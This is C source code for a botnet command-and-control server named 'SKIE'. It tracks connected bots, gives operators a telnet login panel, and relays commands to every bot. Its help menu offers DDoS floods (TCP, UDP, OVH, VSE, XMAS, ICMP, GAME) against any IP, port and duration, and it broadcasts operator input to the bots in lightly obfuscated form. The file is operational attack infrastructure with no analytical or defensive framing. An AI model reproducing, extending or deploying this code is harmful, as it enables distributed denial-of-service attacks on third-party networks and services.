#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <unistd.h>

#define TABLE_KEY 1
#define TABLE_KEY2 2
#define max_fds 1000000

char usernamez[80];

struct login_info {
    char username[100];
    char password[100];
};

static struct login_info accounts[100];
int bfdd(const char *command);

struct clientdata_t {
    uint32_t ip;
    char connected;
} clients[max_fds];

struct telnetdata_t {
    int connected;
} managements[max_fds];

struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

char estring[30];
static volatile int epollFD = 0;
static volatile int listenFD = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;

    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }

    return got;
}

void trim(char *str) {
    int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;

    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd) {
    int flags, s;

    flags = fcntl(sfd, F_GETFL, 0);

    if (flags == -1) {
        perror("fcntl");
        return -1;
    }

    flags |= O_NONBLOCK;

    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;

    int s, sfd;

    memset(&hints, 0, sizeof(struct addrinfo));

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }

    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);

        if (sfd == -1) continue;

        int yes = 1;

        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");

        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);

        if (s == 0) {
            break;
        }

        close(sfd);
    }

    if (rp == NULL) {
        fprintf(stderr, "Could not bind\n");
        return -1;
    }

    freeaddrinfo(result);
    return sfd;
}

void encrypt_by_name(char *str) {
    sprintf(estring, str, sizeof(str));
    int i;
    
    for(i = 0; i < strlen(estring); i++){
        estring[i] = estring[i] + TABLE_KEY; 
    }
}

void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1;

    if (strcmp(msg, "SKIE") == 0)
        sendMGM = 0;
    
    char *wot = malloc(strlen(msg) + 10);
    
    memset(wot, 0, strlen(msg) + 10);
    
    strcpy(wot, msg);
    
    trim(wot);
    
    time_t rawtime;
    
    struct tm *timeinfo;
    
    time(&rawtime);
    
    timeinfo = localtime(&rawtime);
    
    char *timestamp = asctime(timeinfo);
    
    trim(timestamp);
    
    int i;
    
    for (i = 0; i < max_fds; i++) {
        if (i == us || (!clients[i].connected))
            continue;
    
        if (sendMGM && managements[i].connected) {
            send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
            send(i, sender, strlen(sender), MSG_NOSIGNAL);
            send(i, ": ", 2, MSG_NOSIGNAL);
        }
        encrypt_by_name(msg);
        send(i, estring, strlen(estring), MSG_NOSIGNAL);
        send(i, "\n", 1, MSG_NOSIGNAL);
        memset(estring, 0, sizeof(estring));
    }
    free(wot);
}

const char *get_host(uint32_t addr) {
    struct in_addr in_addr_ip;

    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}

void *BotEventLoop(void *useless) {
    struct epoll_event event;
    struct epoll_event *events;
    
    int s;
    
    events = calloc(max_fds, sizeof event);
    
    while (1) {
        int n, i;
    
        n = epoll_wait(epollFD, events, max_fds, -1);
    
        for (i = 0; i < n; i++) {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0;
                close(events[i].data.fd);
                continue;
            } else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;

                    in_len = sizeof in_addr;
                    infd = accept(listenFD, &in_addr, &in_len);
    
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else {
                            perror("accept");
                            break;
                        }
                    }

                    clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
    
                    int dup = 0;
    
                    for (ipIndex = 0; ipIndex < max_fds; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue;
                        if (clients[ipIndex].ip == clients[infd].ip) {
                            dup = 1;
                            break;
                        }
                    }
    
                    if (dup) {
                        if (send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) {
                            close(infd);
                            continue;
                        }
                        close(infd);
                        continue;
                    }

                    clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
                    printf("\033[1;95m[\033[1;37mSKIE\033[1;95m]\033[1;37m Device Connected \033[1;95m[\033[1;37m%s\033[1;95m]\033[1;37m\n", get_host(clients[infd].ip));

                    s = make_socket_non_blocking(infd);
                    
                    if (s == -1) {
                        close(infd);
                        break;
                    }
                    
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    
                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1) {
                        perror("epoll_ctl");
                        close(infd);
                        break;
                    }
                    
                    clients[infd].connected = 1;
                }
                continue;
            } else {
                int datafd = events[i].data.fd, done = 0;

                struct clientdata_t *client = &(clients[datafd]);

                client->connected = 1;

                while (1) {
                    ssize_t count;

                    char buf[2048];

                    memset(buf, 0, sizeof buf);

                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
                        if (strstr(buf, "\n") == NULL) {
                            done = 1;
                            break;
                        }

                        trim(buf);

                        if (strcmp(buf, "SKIE") == 0) {
                            if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;
                                break;
                            }
                            continue;
                        }
                    }

                    if (count == -1) {
                        if (errno != EAGAIN) {
                            done = 1;
                        }
                        break;
                    } else if (count == 0) {
                        done = 1;
                        break;
                    }

                    if (done) {
                        client->connected = 0;
                        close(datafd);
                    }
                }
            }
        }
    }
}

unsigned int BotsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < max_fds; i++) {
        if (!clients[i].connected) continue;
        total++;
    }
    return total;
}

int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512];

    if ((fp = fopen("login.txt", "r")) == NULL) {
        return (-1);
    }
    while (fgets(temp, 512, fp) != NULL) {
        if ((strstr(temp, str)) != NULL) {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if (fp)
        fclose(fp);
    if (find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
    int datafd = (int) sock;
    int find_line;
    
    pthread_t title;
    
    char usernamez[80];
    char message[128];
    char buf[2048];
    char *username;
    char *password;

    int choose = rand() % 4;

    if(choose == 1){
        sprintf(message, "\033[0m\033[2J\033[1;1H");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\033[1;37mCaptcha\033[1;95m:\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m                ,--.    ,--.  ,--.   \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m ,--,--.,--,--, |  |,-. `--\',-\'  \'-. \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m' ,-.  ||      \\|     / ,--.'-.  .-' \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m\\ '-'  ||  ||  ||  \\  \\ |  |  |  |  \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m `--`--'`--''--'`--'`--'`--'  `--'   \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);

        sprintf(message, "\033[1;37mAnswer\033[1;95m:\033[1;37m ");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        fdgets(buf, sizeof buf, datafd);

        trim(buf);

        if(strcmp(buf, "ankit") == 0){
            sprintf(message, "\033[1;37mCorrect!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
        } else{
            sprintf(message, "\033[1;37mWrong!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
            close(datafd);
        }

    } else if(choose == 2){
        sprintf(message, "\033[0m\033[2J\033[1;1H");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;37mCaptcha\033[1;95m:\r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m,--. ,--.,--.,--.             ,---.           \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m|  | |  |`--'|  |    ,--,--. /    |,--.  ,--. \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m|  | |  |,--.|  |   ' ,-.  |/  '  | \\  `'  /  \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m'  '-'  '|  ||  '--.\\ '-'  |'--|  |  \\    /   \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m `-----' `--'`-----' `--`--'   `--'   `--'    \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);

        sprintf(message, "\033[1;37mAnswer\033[1;95m:\033[1;37m ");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        fdgets(buf, sizeof buf, datafd);

        trim(buf);

        if(strcmp(buf, "UiLa4v") == 0){
            sprintf(message, "\033[1;37mCorrect!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
        } else{
            sprintf(message, "\033[1;37mWrong!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
            close(datafd);
        }

    } else if(choose == 3){
        sprintf(message, "\033[0m\033[2J\033[1;1H");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\033[1;37mCaptcha\033[1;95m:\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m,--.         ,-----.,--.   ,------. \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m`--',--. ,--.|  .--'|  |-. |  .---' \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m,--. \\  '  / '--. `\\| .-. '|  `--,  \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m|  |  \\   '  .--'  /| `-' ||  |`    \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m`--'.-'  /   `----'  `---' `--'     \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m    `---'                           \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);

        sprintf(message, "\033[1;37mAnswer\033[1;95m:\033[1;37m ");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        fdgets(buf, sizeof buf, datafd);

        trim(buf);

        if(strcmp(buf, "iy5bF") == 0){
            sprintf(message, "\033[1;37mCorrect!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
        } else{
            sprintf(message, "\033[1;37mWrong!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
            close(datafd);
        }

    } else {
        sprintf(message, "\033[0m\033[2J\033[1;1H");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\033[1;37mCaptcha\033[1;95m:\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m,--.         ,-----.,--.   ,------. \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m`--',--. ,--.|  .--'|  |-. |  .---' \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m,--. \\  '  / '--. `\\| .-. '|  `--,  \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m|  |  \\   '  .--'  /| `-' ||  |`    \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m`--'.-'  /   `----'  `---' `--'     \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        sprintf(message, "\r\033[1;95m    `---'                           \r\n");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);

        sprintf(message, "\033[1;37mAnswer\033[1;95m:\033[1;37m ");
        send(datafd, message, strlen(message), MSG_NOSIGNAL);
        fdgets(buf, sizeof buf, datafd);

        trim(buf);

        if(strcmp(buf, "iy5bF") == 0){
            sprintf(message, "\033[1;37mCorrect!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
        } else{
            sprintf(message, "\033[1;37mWrong!");
            send(datafd, message, strlen(message), MSG_NOSIGNAL);
            sleep(1);
            close(datafd);
        }
    }

    memset(buf, 0, sizeof buf);

    FILE *fp;
    
    int i = 0, c, j = 0;

    fp = fopen("login.txt", "r");
    
    while (!feof(fp)) {
        c = fgetc(fp);
        ++i;
    }
    
    rewind(fp);
    
    while (j != i - 1) {
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }

    char clearscreen[10];
    
    memset(clearscreen, 0, 10);
    sprintf(clearscreen, "\033[1A");
    
    char user[5000];
    char user2[5000];

    sprintf(user, "\033[0m\033[2J\033[1;1H");
    sprintf(user2, "\033[1;37mUsername\033[1;95m:\033[1;37m ");

    if (send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, user2, strlen(user2), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
    
    trim(buf);
    
    char *nickstring;
    
    sprintf(accounts[find_line].username, buf);
    sprintf(usernamez, buf);
    
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    
    if (strcmp(nickstring, accounts[find_line].username) == 0) {
        char password[5000];
        
        if (send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1)
            goto end;
        
        sprintf(password, "\r\n\033[1;37mPassword\033[1;95m:\033[1;37m ", accounts[find_line].username);
        
        if (send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1)
            goto end;

        if (fdgets(buf, sizeof buf, datafd) < 1)
            goto end;

        trim(buf);
        
        if (strcmp(buf, accounts[find_line].password) != 0) 
            goto failed;
        
        memset(buf, 0, 2048);

        goto success;
    }
    
    void *TitleWriter(void *sock) {
        int datafd = (int) sock;
        char string[2048];
        
        while (1) {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Loaded %d | %s %c", '\033', BotsConnected(), usernamez, '\007');
            if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) 
                continue;
            sleep(2);
        }
    }
    
    failed:
    if (send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1)
        goto end;
    goto end;

    success:
    pthread_create(&title, NULL, &TitleWriter, sock);

    char ascii_banner_line1[12];

    sprintf(ascii_banner_line1, "\033[2J\033[1;1H");

    if (send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    while (1) {
        char input[5000];
        sprintf(input, "\033[1;37m%s\033[1;95m@\033[1;37mskie\033[1;95m~#\033[1;37m ", usernamez);
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        break;
    }
    
    managements[datafd].connected = 1;

    while (fdgets(buf, sizeof buf, datafd) > 0) {
        if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 1) == 0 || strncmp(buf, "Help", 4) == 0) {
            
            char hp1[256];
            char hp2[256];
            char hp3[256];
            char hp4[256];
            char hp5[256];
            char hp6[256];
            char hp7[256];

            sprintf(hp1, "\033[1;37mTCP \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m TCP Attack\r\n");
            sprintf(hp2, "\033[1;37mUDP \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m Raw UDP Attack\r\n");
            sprintf(hp3, "\033[1;37mOVH \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m STD Attack\r\n");
            sprintf(hp4, "\033[1;37mVSE \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m VSE Attack\r\n");
            sprintf(hp5, "\033[1;37mXMAS \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m XMAS Attack\r\n");
            sprintf(hp6, "\033[1;37mICMP \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m ICMP Attack\r\n");
            sprintf(hp7, "\033[1;37mGAME \033[1;95m[\033[1;37mIP\033[1;95m] [\033[1;37mPORT\033[1;95m] [\033[1;37mTIME\033[1;95m] |\033[1;37m GAME Attack\r\n");

            if (send(datafd, hp1, strlen(hp1), MSG_NOSIGNAL) == -1)
                goto end;
            if (send(datafd, hp2, strlen(hp2), MSG_NOSIGNAL) == -1)
                goto end;
            if (send(datafd, hp3, strlen(hp3), MSG_NOSIGNAL) == -1)
                goto end;
            if (send(datafd, hp4, strlen(hp4), MSG_NOSIGNAL) == -1)
                goto end;
            if (send(datafd, hp5, strlen(hp5), MSG_NOSIGNAL) == -1)
                goto end;
            if (send(datafd, hp6, strlen(hp6), MSG_NOSIGNAL) == -1)
                goto end;
            if (send(datafd, hp7, strlen(hp7), MSG_NOSIGNAL) == -1)
                goto end;
        }

        if (strncmp(buf, "clear", 5) == 0 || strncmp(buf, "c", 1) == 0 || strncmp(buf, "cls", 3) == 0) {
            if (send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1)
                goto end;
        }

        if(strncmp(buf, "quit", 4) == 0){
            close(datafd);
        }
        
        trim(buf);
        
        char input[5000];
        
        sprintf(input, "\033[1;37m%s\033[1;95m@\033[1;37mskie\033[1;95m~#\033[1;37m ", usernamez);
        
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1)
            goto end;
        
        if (strlen(buf) == 0)
            continue;
        
        broadcast(buf, datafd, accounts[find_line].username);
        
        memset(buf, 0, 2048);
    }

    end:
    managements[datafd].connected = 0;
    
    close(datafd);
}

void *BotListener(int port) {
    int sockfd, newsockfd;
    
    socklen_t clilen;
    
    struct sockaddr_in serv_addr, cli_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    if (sockfd < 0) 
        perror("ERROR opening socket");
    
    bzero((char *) &serv_addr, sizeof(serv_addr));
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
        perror("ERROR on binding");
    
    listen(sockfd, 5);
    
    clilen = sizeof(cli_addr);
    
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0)
            perror("ERROR on accept");
        
        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *) newsockfd);
    }
}

int main(int argc, char *argv[], void *sock) {
    signal(SIGPIPE, SIG_IGN);
    
    int s, threads, port;
    
    struct epoll_event event;
    
    if (argc != 4) {
        fprintf(stderr, "Usuage: %s [bot-port] [threads] [cnc-port]\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    port = atoi(argv[3]);
    threads = atoi(argv[2]);

    printf("[SKIE SCREENED]\n");
    
    listenFD = create_and_bind(argv[1]);
    
    if (listenFD == -1) 
        abort();
    
    s = make_socket_non_blocking(listenFD);
    
    if (s == -1)
        abort();
    
    s = listen(listenFD, SOMAXCONN);
    
    if (s == -1) {
        perror("listen");
        abort();
    }
    
    epollFD = epoll_create1(0);
    
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }
    
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }
    
    pthread_t thread[threads + 2];
    
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
    }
    
    pthread_create(&thread[0], NULL, &BotListener, port);
    
    while (1) {
        broadcast("SKIE", -1, "Skie");
        sleep(2);
    }
    
    close(listenFD);
    return EXIT_SUCCESS;
}
